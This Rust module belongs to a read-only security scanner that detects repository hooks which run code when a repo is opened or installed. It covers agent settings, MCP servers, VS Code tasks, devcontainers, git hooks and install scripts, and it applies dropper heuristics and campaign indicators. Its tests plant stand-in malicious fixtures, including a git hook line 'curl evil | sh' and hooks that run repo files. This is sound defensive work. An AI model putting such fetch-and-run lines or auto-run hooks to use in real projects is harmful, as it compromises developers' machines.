//! Code a repo runs the moment it is opened, installed or built, without
//! anyone reading it: agent hooks (`.claude/settings.json`,
//! `.gemini/settings.json`), MCP servers that run a file in the repo,
//! editor tasks that run on folder open, devcontainer commands, direnv,
//! the repo's own install scripts, gyp command expansions, and native
//! addons loaded at install. A hook that runs a file kept in the repo is
//! what a hijacked repo looks like (JFrog, "Beyond testmetest", 2026-10):
//! the payload hides in a 13 MB `.github/init.js` that code search never
//! indexes, and the hook fires when the clone is opened in an agent.
//!
//! Everything here is read-only and bounded: no hook is run, no target is
//! executed, files are read through [`crate::system::read_capped`].

use crate::harnesses;
use crate::json::str_at;
use crate::repos::{self, Repo};
use crate::system::read_capped;
use serde_json::Value;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

/// What a hook does, and how sure we are it is hostile.
#[derive(Clone, Debug, PartialEq)]
pub struct Hook {
    /// The file that configures it, relative to the repo.
    pub file: String,
    /// When it runs ("Claude Code SessionStart hook", "VS Code task on folder open").
    pub when: String,
    /// The command, as configured.
    pub command: String,
    /// `RUNS-REPO-FILE` (fail: the command runs a file kept in this repo),
    /// `LOADER` (fail: that file looks like a dropper), `IOC` (fail: a known
    /// indicator), `OPEN-HOOK` (warn: runs a command on open), `INSTALL-HOOK`
    /// (warn: runs a command at install), `MARKER` (warn: a campaign's
    /// commit or branch marker).
    pub id: &'static str,
    pub note: String,
}

impl Hook {
    pub fn fails(&self) -> bool {
        matches!(self.id, "RUNS-REPO-FILE" | "LOADER" | "IOC")
    }
}

/// Indicators from the bundled list (`--repo-hooks FILE` replaces it).
#[derive(Default)]
pub struct Indicators {
    pub files: BTreeSet<String>,
    pub packages: BTreeSet<String>,
    pub hosts: Vec<String>,
    pub sha256: BTreeSet<String>,
}

impl Indicators {
    pub fn parse(text: &str) -> Indicators {
        let mut out = Indicators::default();
        for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
            match line.split_once(' ') {
                Some(("file", v)) => {
                    out.files.insert(v.trim().to_string());
                }
                Some(("package", v)) => {
                    out.packages.insert(v.trim().to_string());
                }
                Some(("host", v)) => out.hosts.push(v.trim().to_string()),
                Some(("sha256", v)) => {
                    out.sha256.insert(v.trim().to_ascii_lowercase());
                }
                _ => {}
            }
        }
        out
    }
}

/// The largest script a hook may reasonably run; bigger ones hide a payload.
const MAX_SCRIPT: u64 = 1 << 20;
/// How much of a target file is read for the loader heuristics.
const SNIFF: u64 = 4 << 20;

/// Strings a dropper carries and an honest setup script doesn't.
const LOADER_MARKS: &[&str] = &[
    "/proc/self/maps",
    "TracerPid",
    "IsDebuggerPresent",
    "CheckRemoteDebuggerPresent",
    "CreateProcessA",
    "/-/npm/v1/oidc",
    ".napi_cache",
    "GlobalMemoryStatusEx",
    "/proc/1/cgroup",
];

/// The hooks in one repo.
pub fn scan_repo(root: &Path, iocs: &Indicators) -> Vec<Hook> {
    let mut out = Vec::new();
    agent_hooks(root, &mut out);
    mcp_servers(root, &mut out);
    vscode_tasks(root, &mut out);
    devcontainers(root, &mut out);
    if root.join(".envrc").is_file() {
        out.push(Hook {
            file: ".envrc".into(),
            when: "direnv, on every cd (once allowed)".into(),
            command: first_line(&root.join(".envrc")),
            id: "OPEN-HOOK",
            note: "runs a shell script when you enter the directory".into(),
        });
    }
    git_hooks(root, &mut out);
    install_hooks(root, iocs, &mut out);
    let targets: Vec<(String, PathBuf)> =
        out.iter().filter_map(|h| repo_target(root, &h.command).map(|t| (h.file.clone(), t))).collect();
    for (file, target) in targets {
        sniff(root, &file, &target, iocs, &mut out);
    }
    out.sort_by(|a, b| (a.file.as_str(), a.when.as_str()).cmp(&(b.file.as_str(), b.when.as_str())));
    out.dedup();
    out
}

/// Claude Code and Gemini CLI hooks: `{"hooks": {"<Event>": [{"hooks":
/// [{"type": "command", "command": "…"}]}]}}`. Any `command` string under
/// `hooks` counts, whatever the harness calls its events.
fn agent_hooks(root: &Path, out: &mut Vec<Hook>) {
    for (file, harness) in [
        (".claude/settings.json", "Claude Code"),
        (".claude/settings.local.json", "Claude Code"),
        (".gemini/settings.json", "Gemini CLI"),
    ] {
        let path = root.join(file);
        if !path.is_file() {
            continue;
        }
        let Some(hooks) = load_json(&path).get("hooks").cloned() else { continue };
        let mut found = Vec::new();
        commands_under(&hooks, "", &mut found);
        for (event, command) in found {
            let repo_file = repo_target(root, &command).is_some();
            out.push(Hook {
                file: file.into(),
                when: format!("{harness} {event} hook"),
                note: if repo_file {
                    "runs a file kept in this repo as soon as the repo is opened in the agent".into()
                } else {
                    "runs a command from the repo's own settings when the agent starts or acts".into()
                },
                id: if repo_file { "RUNS-REPO-FILE" } else { "OPEN-HOOK" },
                command,
            });
        }
    }
}

/// Every string under a `command` key, with the nearest enclosing object key
/// (the event name) as context.
fn commands_under(v: &Value, event: &str, out: &mut Vec<(String, String)>) {
    match v {
        Value::Object(m) => {
            for (k, child) in m {
                if k == "command" {
                    if let Some(c) = child.as_str() {
                        out.push((event.to_string(), c.to_string()));
                    }
                } else {
                    // The event is the key that holds the matchers; the inner
                    // `hooks` arrays and matcher objects keep it.
                    let next =
                        if k == "hooks" || !(child.is_array() || child.is_object()) { event } else { k.as_str() };
                    commands_under(child, next, out);
                }
            }
        }
        Value::Array(a) => {
            for child in a {
                commands_under(child, event, out);
            }
        }
        _ => {}
    }
}

/// MCP servers the repo configures whose command is a file in the repo.
fn mcp_servers(root: &Path, out: &mut Vec<Hook>) {
    let repo: Repo = (String::new(), root.to_path_buf());
    for s in harnesses::mcp_servers(std::slice::from_ref(&repo), false) {
        let command = std::iter::once(s.command.clone()).chain(s.args.iter().cloned()).collect::<Vec<_>>().join(" ");
        if repo_target(root, &command).is_some() {
            let file =
                Path::new(&s.file).strip_prefix(root).unwrap_or(Path::new(&s.file)).to_string_lossy().into_owned();
            out.push(Hook {
                file,
                when: format!("MCP server {} (started by the agent)", s.name),
                command,
                id: "RUNS-REPO-FILE",
                note: "the agent starts this file from the repo as a server when the project opens".into(),
            });
        }
    }
}

/// VS Code tasks with `runOptions.runOn: "folderOpen"`.
fn vscode_tasks(root: &Path, out: &mut Vec<Hook>) {
    let path = root.join(".vscode/tasks.json");
    if !path.is_file() {
        return;
    }
    let data = load_json(&path);
    for task in data.get("tasks").and_then(Value::as_array).into_iter().flatten() {
        let on_open = task.get("runOptions").map(|r| str_at(r, "runOn") == "folderOpen").unwrap_or(false);
        if !on_open {
            continue;
        }
        let mut command = str_at(task, "command").to_string();
        for a in task.get("args").and_then(Value::as_array).into_iter().flatten() {
            if let Some(a) = a.as_str() {
                command.push(' ');
                command.push_str(a);
            }
        }
        let repo_file = repo_target(root, &command).is_some();
        out.push(Hook {
            file: ".vscode/tasks.json".into(),
            when: format!("VS Code task \"{}\" on folder open", str_at(task, "label")),
            command,
            id: if repo_file { "RUNS-REPO-FILE" } else { "OPEN-HOOK" },
            note: "runs when the folder is opened in VS Code (after the one-time 'allow automatic tasks' prompt)"
                .into(),
        });
    }
}

/// devcontainer lifecycle commands; `initializeCommand` runs on the host.
fn devcontainers(root: &Path, out: &mut Vec<Hook>) {
    let mut files = vec![root.join(".devcontainer/devcontainer.json"), root.join(".devcontainer.json")];
    if let Ok(rd) = std::fs::read_dir(root.join(".devcontainer")) {
        files.extend(rd.filter_map(|e| e.ok()).map(|e| e.path().join("devcontainer.json")));
    }
    for path in files.into_iter().filter(|p| p.is_file()) {
        let data = load_json(&path);
        let file = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().into_owned();
        for key in [
            "initializeCommand",
            "onCreateCommand",
            "updateContentCommand",
            "postCreateCommand",
            "postStartCommand",
            "postAttachCommand",
        ] {
            let Some(v) = data.get(key) else { continue };
            let command = match v {
                Value::String(s) => s.clone(),
                Value::Array(a) => a.iter().filter_map(Value::as_str).collect::<Vec<_>>().join(" "),
                Value::Object(m) => m.values().filter_map(Value::as_str).collect::<Vec<_>>().join("; "),
                _ => continue,
            };
            let host = key == "initializeCommand";
            let repo_file = host && repo_target(root, &command).is_some();
            out.push(Hook {
                file: file.clone(),
                when: format!(
                    "devcontainer {key}{}",
                    if host { " (on this machine, before the container exists)" } else { "" }
                ),
                command,
                id: if repo_file { "RUNS-REPO-FILE" } else { "OPEN-HOOK" },
                note: if host {
                    "runs on your machine when the dev container is created or reopened".into()
                } else {
                    "runs inside the dev container when it is created or started".into()
                },
            });
        }
    }
}

/// Executable hooks under .git/hooks (not committed: someone put them here).
fn git_hooks(root: &Path, out: &mut Vec<Hook>) {
    let Ok(rd) = std::fs::read_dir(root.join(".git/hooks")) else { return };
    for e in rd.filter_map(|e| e.ok()) {
        let name = e.file_name().to_string_lossy().into_owned();
        if name.ends_with(".sample") {
            continue;
        }
        #[cfg(unix)]
        let executable = {
            use std::os::unix::fs::PermissionsExt;
            e.metadata().is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        };
        #[cfg(not(unix))]
        let executable = e.metadata().is_ok_and(|m| m.is_file());
        if executable {
            out.push(Hook {
                file: format!(".git/hooks/{name}"),
                when: format!("git {name} hook"),
                command: first_line(&e.path()),
                id: "OPEN-HOOK",
                note: "a local git hook (not part of the repo's history) runs on that git operation".into(),
            });
        }
    }
}

/// The repo's own install-time code: package.json lifecycle scripts, gyp
/// command expansions, composer scripts, and native addons by name.
fn install_hooks(root: &Path, iocs: &Indicators, out: &mut Vec<Hook>) {
    for (dir, files) in repos::walk(root, 4) {
        let rel =
            |name: &str| dir.join(name).strip_prefix(root).unwrap_or(&dir.join(name)).to_string_lossy().into_owned();
        for name in &files {
            if iocs.files.contains(name) {
                out.push(Hook {
                    file: rel(name),
                    when: "a file a known campaign ships".into(),
                    command: String::new(),
                    id: "IOC",
                    note: format!("{name} is a file name from a known hijacked-repo campaign"),
                });
            }
        }
        if files.iter().any(|f| f == "package.json") {
            let data = load_json(&dir.join("package.json"));
            for key in ["preinstall", "install", "postinstall", "prepare", "prepublish", "preprepare", "postprepare"] {
                let Some(cmd) = data.get("scripts").and_then(|s| s.get(key)).and_then(Value::as_str) else { continue };
                let loads_addon = cmd.contains(".node") || cmd.contains("node-gyp") || cmd.contains("prebuild");
                let repo_file = repo_target(&dir, cmd).is_some();
                out.push(Hook {
                    file: rel("package.json"),
                    when: format!("npm {key} script"),
                    command: cmd.to_string(),
                    id: if repo_file && loads_addon { "RUNS-REPO-FILE" } else { "INSTALL-HOOK" },
                    note: if loads_addon {
                        "runs at npm install and loads or builds a native addon".into()
                    } else {
                        "runs at npm install".into()
                    },
                });
            }
            for section in ["dependencies", "devDependencies", "optionalDependencies"] {
                for name in data.get(section).and_then(Value::as_object).into_iter().flat_map(|m| m.keys()) {
                    if iocs.packages.contains(name) {
                        out.push(Hook {
                            file: rel("package.json"),
                            when: format!("{section}: {name}"),
                            command: String::new(),
                            id: "IOC",
                            note: format!("{name} is a package from a known malicious campaign"),
                        });
                    }
                }
            }
        }
        if files.iter().any(|f| f == "binding.gyp") {
            let text = read_capped(&dir.join("binding.gyp"), MAX_SCRIPT).unwrap_or_default();
            if text.contains("<!(") || text.contains("<!@(") {
                out.push(Hook {
                    file: rel("binding.gyp"),
                    when: "node-gyp command expansion at install".into(),
                    command: text.lines().find(|l| l.contains("<!")).unwrap_or("").trim().to_string(),
                    id: "INSTALL-HOOK",
                    note: "`<!(…)` runs a command whenever the addon is built, even with no install script declared"
                        .into(),
                });
            }
        }
        if files.iter().any(|f| f == "composer.json") {
            let data = load_json(&dir.join("composer.json"));
            for (k, v) in data.get("scripts").and_then(Value::as_object).into_iter().flatten() {
                if !(k.starts_with("pre-") || k.starts_with("post-")) {
                    continue;
                }
                let command = match v {
                    Value::String(s) => s.clone(),
                    Value::Array(a) => a.iter().filter_map(Value::as_str).collect::<Vec<_>>().join("; "),
                    _ => continue,
                };
                out.push(Hook {
                    file: rel("composer.json"),
                    when: format!("composer {k} script"),
                    command,
                    id: "INSTALL-HOOK",
                    note: "runs at composer install or update".into(),
                });
            }
        }
    }
}

/// A file in the repo that `command` runs: the first word that names an
/// existing path under `root` (`node .github/init.js`, `./setup.sh`,
/// `bun run ci.js`), never a path outside it.
pub fn repo_target(root: &Path, command: &str) -> Option<PathBuf> {
    for word in command.split(|c: char| c.is_whitespace() || "|&;()".contains(c)) {
        let word = word.trim_matches(|c| c == '"' || c == '\'' || c == '`');
        if word.is_empty() || word.starts_with('-') || word.starts_with('$') {
            continue;
        }
        let rel = Path::new(word);
        if rel.is_absolute() || rel.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
            continue;
        }
        let looks_like_file = word.contains('/') || word.contains('.');
        if !looks_like_file {
            continue;
        }
        let path = root.join(rel);
        if path.is_file() {
            return Some(path);
        }
    }
    None
}

/// What the file a hook runs looks like: oversized, a known hash, naming a
/// known host, or carrying the marks of a dropper.
fn sniff(root: &Path, file: &str, target: &Path, iocs: &Indicators, out: &mut Vec<Hook>) {
    let rel = target.strip_prefix(root).unwrap_or(target).to_string_lossy().into_owned();
    let Ok(meta) = std::fs::metadata(target) else { return };
    let script = matches!(
        target.extension().and_then(|e| e.to_str()),
        Some("js" | "cjs" | "mjs" | "ts" | "sh" | "py" | "rb" | "ps1" | "cmd" | "bat")
    );
    if script && meta.len() > MAX_SCRIPT {
        out.push(Hook {
            file: file.into(),
            when: format!("the file it runs, {rel}"),
            command: String::new(),
            id: "LOADER",
            note: format!(
                "{} MB for a script that runs on open: a payload hides in a file this size",
                meta.len() >> 20
            ),
        });
    }
    let Ok(bytes) = crate::system::read_capped(target, SNIFF) else { return };
    let digest = crate::sha256::hex(bytes.as_bytes());
    if iocs.sha256.contains(&digest) {
        out.push(Hook {
            file: file.into(),
            when: format!("the file it runs, {rel}"),
            command: String::new(),
            id: "IOC",
            note: "this exact file is a known malicious loader".into(),
        });
    }
    if let Some(h) = iocs.hosts.iter().find(|h| bytes.contains(h.as_str())) {
        out.push(Hook {
            file: file.into(),
            when: format!("the file it runs, {rel}"),
            command: String::new(),
            id: "IOC",
            note: format!("names {h}, a known campaign's host"),
        });
    }
    let marks: Vec<&str> = LOADER_MARKS.iter().copied().filter(|m| bytes.contains(m)).collect();
    if marks.len() >= 2 {
        out.push(Hook {
            file: file.into(),
            when: format!("the file it runs, {rel}"),
            command: String::new(),
            id: "LOADER",
            note: format!("looks like a dropper: checks for {}", marks.join(", ")),
        });
    }
}

/// `skip-checks:true` trailers and `chore/ci-<hex>` / `deps/upd-<n>` branches,
/// the markers of the testmetest campaign's commits in a hijacked repo.
pub fn campaign_markers(root: &Path) -> Vec<Hook> {
    use std::ffi::OsStr;
    use std::time::Duration;
    let mut out = Vec::new();
    let refs = crate::system::run(
        &[
            OsStr::new("git"),
            OsStr::new("-C"),
            root.as_os_str(),
            OsStr::new("for-each-ref"),
            OsStr::new("--format=%(refname:short)"),
        ],
        Duration::from_secs(15),
    );
    for r in refs.lines().map(str::trim) {
        let name = r.rsplit_once('/').map_or(r, |(_, n)| n);
        let prefix = r.strip_suffix(name).unwrap_or("");
        let ci = prefix.ends_with("chore/ci-") && name.len() >= 6 && name.bytes().all(|b| b.is_ascii_hexdigit());
        let upd = prefix.ends_with("deps/upd-") && !name.is_empty() && name.bytes().all(|b| b.is_ascii_digit());
        if ci || upd {
            out.push(Hook {
                file: ".git".into(),
                when: format!("branch {r}"),
                command: String::new(),
                id: "MARKER",
                note: "a branch named the way a known campaign names the ones it pushes to hijacked repos".into(),
            });
        }
    }
    let log = crate::system::run(
        &[
            OsStr::new("git"),
            OsStr::new("-C"),
            root.as_os_str(),
            OsStr::new("log"),
            OsStr::new("-n"),
            OsStr::new("500"),
            OsStr::new("--format=%H%x00%B%x01"),
        ],
        Duration::from_secs(30),
    );
    for entry in log.split('\u{1}') {
        let Some((hash, body)) = entry.trim_start().split_once('\0') else { continue };
        if body.lines().any(|l| {
            l.trim().eq_ignore_ascii_case("skip-checks:true") || l.trim().eq_ignore_ascii_case("skip-checks: true")
        }) {
            out.push(Hook {
                file: ".git".into(),
                when: format!("commit {}", hash.chars().take(12).collect::<String>()),
                command: String::new(),
                id: "MARKER",
                note: "carries the `skip-checks:true` trailer a known campaign puts on the commits it pushes".into(),
            });
        }
    }
    out
}

fn load_json(path: &Path) -> Value {
    let Ok(text) = read_capped(path, 16 << 20) else { return Value::Null };
    serde_json::from_str(&text).unwrap_or_else(|_| {
        // tasks.json and settings files are often JSON with comments and trailing commas.
        let stripped = crate::re::Regex::with_flags(r"^\s*//[^\n]*$|/\*.*?\*/", "ms").replace_all(&text, "");
        serde_json::from_str(&without_trailing_commas(&stripped)).unwrap_or(Value::Null)
    })
}

/// `text` with the commas that only precede a closing `}` or `]` removed.
fn without_trailing_commas(text: &str) -> String {
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    for (i, c) in chars.iter().enumerate() {
        if *c == ',' {
            let next = chars[i + 1..].iter().find(|n| !n.is_whitespace());
            if matches!(next, Some('}') | Some(']')) {
                continue;
            }
        }
        out.push(*c);
    }
    out
}

fn first_line(path: &Path) -> String {
    read_capped(path, MAX_SCRIPT)
        .unwrap_or_default()
        .lines()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with('#'))
        .unwrap_or("")
        .chars()
        .take(160)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::system::TempDir;

    fn repo() -> TempDir {
        let d = TempDir::new("hooks").unwrap();
        std::fs::create_dir_all(d.path().join(".git/hooks")).unwrap();
        d
    }

    fn write(d: &TempDir, rel: &str, text: &str) {
        let p = d.path().join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }

    fn ids(hooks: &[Hook]) -> Vec<&str> {
        hooks.iter().map(|h| h.id).collect()
    }

    #[test]
    fn a_session_start_hook_running_a_repo_file_fails() {
        let d = repo();
        write(
            &d,
            ".claude/settings.json",
            r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .github/init.js || bun .github/init.js"}]}]}}"#,
        );
        write(&d, ".github/init.js", "console.log(1)");
        let hooks = scan_repo(d.path(), &Indicators::default());
        assert_eq!(hooks.len(), 1, "{hooks:?}");
        assert_eq!(hooks[0].id, "RUNS-REPO-FILE");
        assert_eq!(hooks[0].when, "Claude Code SessionStart hook");
        assert!(hooks[0].fails());
    }

    #[test]
    fn a_hook_running_an_installed_tool_only_warns() {
        let d = repo();
        write(
            &d,
            ".claude/settings.json",
            r#"{"hooks": {"PostToolUse": [{"matcher": "Edit", "hooks": [{"type": "command", "command": "cargo fmt"}]}]}}"#,
        );
        write(&d, ".gemini/settings.json", r#"{"mcpServers": {}, "hooks": {"BeforeTool": [{"command": "echo hi"}]}}"#);
        let hooks = scan_repo(d.path(), &Indicators::default());
        assert_eq!(ids(&hooks), ["OPEN-HOOK", "OPEN-HOOK"], "{hooks:?}");
        assert!(hooks.iter().all(|h| !h.fails()));
    }

    #[test]
    fn oversized_and_dropper_like_targets_are_loaders() {
        let d = repo();
        write(
            &d,
            ".vscode/tasks.json",
            "{\n  // runs on open\n  \"version\": \"2.0.0\",\n  \"tasks\": [{\"label\": \"setup\", \"type\": \"shell\", \"command\": \"node\", \"args\": [\"scripts/setup.js\"], \"runOptions\": {\"runOn\": \"folderOpen\"},}],\n}",
        );
        let big = format!(
            "{}\n{}",
            "x".repeat((MAX_SCRIPT + 1) as usize),
            "fs.readFileSync('/proc/self/maps'); if (status.includes('TracerPid')) {}"
        );
        write(&d, "scripts/setup.js", &big);
        let hooks = scan_repo(d.path(), &Indicators::default());
        let got = ids(&hooks);
        assert!(got.contains(&"RUNS-REPO-FILE"), "{hooks:?}");
        assert_eq!(got.iter().filter(|i| **i == "LOADER").count(), 2, "{hooks:?}");
    }

    #[test]
    fn install_time_hooks_and_indicators() {
        let d = repo();
        write(
            &d,
            "package.json",
            r#"{"name": "x", "scripts": {"postinstall": "node -e \"require('./addon.node')\"", "test": "jest"}, "dependencies": {"@iobandamwer/cache-helper": "1.0.0", "lodash": "4"}}"#,
        );
        write(&d, "addon.node", "ELF");
        write(&d, ".napi_cache", "zz");
        write(&d, "binding.gyp", "{ 'targets': [{ 'target_name': 'a', 'sources': [ \"<!(node index.js)\" ] }] }");
        write(&d, "composer.json", r#"{"scripts": {"post-install-cmd": ["php setup.php"], "test": "phpunit"}}"#);
        write(&d, ".envrc", "# comment\nexport FOO=1\n");
        write(
            &d,
            ".devcontainer/devcontainer.json",
            r#"{"initializeCommand": "sh .devcontainer/init.sh", "postCreateCommand": "npm ci"}"#,
        );
        write(&d, ".devcontainer/init.sh", "echo hi");
        let iocs = Indicators::parse(crate::defaults::REPO_HOOKS);
        let hooks = scan_repo(d.path(), &iocs);
        let mut got = ids(&hooks);
        got.sort_unstable();
        assert_eq!(
            got,
            [
                "INSTALL-HOOK",
                "INSTALL-HOOK",
                "IOC",
                "IOC",
                "IOC",
                "OPEN-HOOK",
                "OPEN-HOOK",
                "RUNS-REPO-FILE",
                "RUNS-REPO-FILE"
            ],
            "{hooks:?}"
        );
        let whens: Vec<&str> = hooks.iter().map(|h| h.when.as_str()).collect();
        assert!(whens.contains(&"npm postinstall script"), "{whens:?}");
        assert!(whens.contains(&"devcontainer initializeCommand (on this machine, before the container exists)"));
        assert!(whens.contains(&"direnv, on every cd (once allowed)"));
    }

    #[test]
    fn mcp_servers_and_git_hooks() {
        let d = repo();
        write(
            &d,
            ".mcp.json",
            r#"{"mcpServers": {"evil": {"command": "node", "args": ["./server/index.js"]}, "ok": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0"]}}}"#,
        );
        write(&d, "server/index.js", "x");
        write(&d, ".git/hooks/post-checkout", "#!/bin/sh\ncurl evil | sh\n");
        write(&d, ".git/hooks/pre-commit.sample", "#!/bin/sh\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(d.path().join(".git/hooks/post-checkout"), std::fs::Permissions::from_mode(0o755))
                .unwrap();
        }
        let hooks = scan_repo(d.path(), &Indicators::default());
        let whens: Vec<&str> = hooks.iter().map(|h| h.when.as_str()).collect();
        assert!(whens.iter().any(|w| w.starts_with("MCP server evil")), "{hooks:?}");
        assert!(!whens.iter().any(|w| w.starts_with("MCP server ok")), "{hooks:?}");
        #[cfg(unix)]
        assert!(whens.contains(&"git post-checkout hook"), "{hooks:?}");
        assert!(!whens.contains(&"git pre-commit.sample hook"));
    }

    #[test]
    fn repo_targets_stay_inside_the_repo() {
        let d = repo();
        write(&d, "x.sh", "");
        assert_eq!(repo_target(d.path(), "sh x.sh"), Some(d.path().join("x.sh")));
        assert_eq!(repo_target(d.path(), "sh ./x.sh"), Some(d.path().join("x.sh")));
        assert_eq!(repo_target(d.path(), "cargo fmt"), None);
        assert_eq!(repo_target(d.path(), "sh ../x.sh"), None);
        assert_eq!(repo_target(d.path(), &format!("sh {}", d.path().join("x.sh").display())), None);
        assert_eq!(repo_target(d.path(), "echo $HOME/x.sh"), None);
    }

    #[test]
    fn indicator_list_parses() {
        let i = Indicators::parse(crate::defaults::REPO_HOOKS);
        assert!(i.files.contains(".napi_cache"));
        assert!(i.packages.contains("@iobandamwer/cache-helper"));
        assert!(i.hosts.iter().any(|h| h == "aiarmor.website"));
        assert_eq!(i.sha256.len(), 7);
    }
}
